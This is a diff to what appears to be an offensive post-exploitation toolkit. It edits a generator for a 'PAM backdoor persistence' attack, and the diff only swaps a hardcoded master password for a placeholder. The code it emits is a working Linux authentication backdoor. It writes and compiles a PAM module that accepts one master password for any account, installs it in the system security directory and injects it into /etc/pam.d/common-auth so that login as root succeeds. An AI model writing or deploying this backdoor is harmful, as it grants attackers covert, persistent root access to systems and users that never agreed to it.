@@ -494,13 +494,13 @@ mv /usr/bin/sudo.bak /usr/bin/sudo"""
         """PAM backdoor persistence (master password)"""
         
         command = f"""# PAM Backdoor Persistence
-# Create PAM module with master password
+# Create PAM module with master password (set MASTER_PASSWORD before compiling)
 cat > /tmp/pam_backdoor.c << 'EOF'
 #include <security/pam_modules.h>
 #include <string.h>
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {{
-    const char *master_pass = "Sup3rS3cr3t!";
+    const char *master_pass = "CHANGE_ME_MASTER_PASSWORD"; // Set to desired master password before use
     const char *password = NULL;
     
     pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
@@ -525,8 +525,8 @@ cp /tmp/pam_backdoor.so /lib/x86_64-linux-gnu/security/
 # Inject into PAM configuration
 sed -i '1i auth sufficient pam_backdoor.so' /etc/pam.d/common-auth
 
-# Now you can login as any user with password: Sup3rS3cr3t!
-# Example: su root (enter: Sup3rS3cr3t!)"""
+# Now you can login as any user with the configured master password
+# Example: su root (enter your chosen master password)"""
         
         removal = f"""sed -i '/pam_backdoor/d' /etc/pam.d/common-auth
 rm -f /lib/x86_64-linux-gnu/security/pam_backdoor.so"""
